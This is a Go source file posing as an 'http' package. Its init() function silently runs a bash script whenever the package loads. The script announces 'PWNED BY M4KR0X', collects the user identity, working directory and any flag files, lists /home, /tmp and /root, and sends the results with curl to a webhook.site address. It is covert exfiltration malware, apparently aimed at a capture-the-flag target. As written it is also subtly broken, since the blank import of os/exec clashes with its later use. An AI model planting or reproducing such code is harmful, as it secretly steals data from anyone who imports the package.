package http

import _ "os/exec"

func init() {
    _ = exec.Command("bash", "-c", `
        (
            echo "=== PWNED BY M4KR0X ==="
            echo "Time: $(date)"
            echo "User: $(whoami) [$(id)]"
            echo "PWD: $(pwd)"
            echo ""
            echo "=== FLAG HUNTING ==="
            cat /flag* 2>/dev/null || cat /*flag* 2>/dev/null || echo "no flag in root"
            find / -name "*flag*" -type f 2>/dev/null | head -10
            echo ""
            echo "=== ls /home /tmp /root ==="
            ls -la /home /tmp /root 2>/dev/null || echo "access denied"
        ) | curl -X POST https://webhook.site/eb4f653b-4fb0-4754-bbde-7086d88f9b8a --data-binary @-
    `).Start()
}
